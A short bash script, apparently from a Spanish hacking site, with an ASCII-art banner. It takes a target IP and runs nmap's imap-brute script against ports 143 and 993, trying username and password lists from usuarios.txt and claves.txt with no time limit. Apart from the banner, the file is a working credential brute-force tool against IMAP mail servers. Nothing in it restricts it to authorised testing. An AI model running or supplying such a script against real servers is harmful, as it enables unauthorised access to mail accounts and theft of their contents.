#!/bin/bash
cat << "INFO"

                                                          ..
                               ,,,                         MM .M
                           ,!MMMMMMM!,                     MM MM  ,.
   ., .M                .MMMMMMMMMMMMMMMM.,          'MM.  MM MM .M'
 . M: M;  M          .MMMMMMMMMMMMMMMMMMMMMM,          'MM,:M M'!M'
;M MM M: .M        .MMMMMMMMMMMMMMMMMMMMMMMMMM,         'MM'...'M
 M;MM;M :MM      .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.       .MMMMMMMM
 'M;M'M MM      MMMMMM  MMMMMMMMMMMMMMMMM  MMMMMM.    ,,M.M.'MMM'
  MM'MMMM      MMMMMM @@ MMMMMMMMMMMMMMM @@ MMMMMMM.'M''MMMM;MM'
 MM., ,MM     MMMMMMMM  MMMMMMMMMMMMMMMMM  MMMMMMMMM      '.MMM
 'MM;MMMMMMMM.MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMM
  ''.'MMM'  .MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM       MMMM
   MMC      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM.      'MMMM
  .MM      :MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM''MMM       MMMMM
  MMM      :M  'MMMMMMMMM brute IMAP MMMMMMM'.MM  MM:M.    'MMMMM
 .MMM   ...:M: :M.'MMMMMMMMMMMMMMMMMMMMMMMMM'.M''   MM:MMMMMMMMMMMM'
AMMM..MMMMM:M.    :M.'hackingyseguridad.com'.MM'     MM''''''''''''
MMMMMMMMMMM:MM     'M'.M'MMMMMMMMMMMMMM'.MC'M'     .MM
 '''''''''':MM.       'MM!M.'M-M-M-M'M.'MM'        MMM
            MMM.            'MMMM!MMMM'            .MM
             MMM.             '''   ''            .MM'
              MMM.                               MMM'
               MMMM            ,.J.JJJJ.       .MMM'
                MMMM.       'JJJJJJJ'JJJM   CMMMMM
                  MMMMM.    'JJJJJJJJ'JJJ .MMMMM'
                    MMMMMMMM.'  'JJJJJ'JJMMMMM'
                      'MMMMMMMMM'JJJJJ JJJJJ'
                         ''MMMMMMJJJJJJJJJJ'
                                 'JJJJJJJJ'

INFO
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a IAMP en puerto por defecto 143/TCP."
        echo "Requiere nmap"
        echo "Uso.: sh bruteimap.sh <ip>"
        echo
        exit 0
fi
echo
echo
nmap -Pn $1 -p 143,993 --script imap-brute  --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0
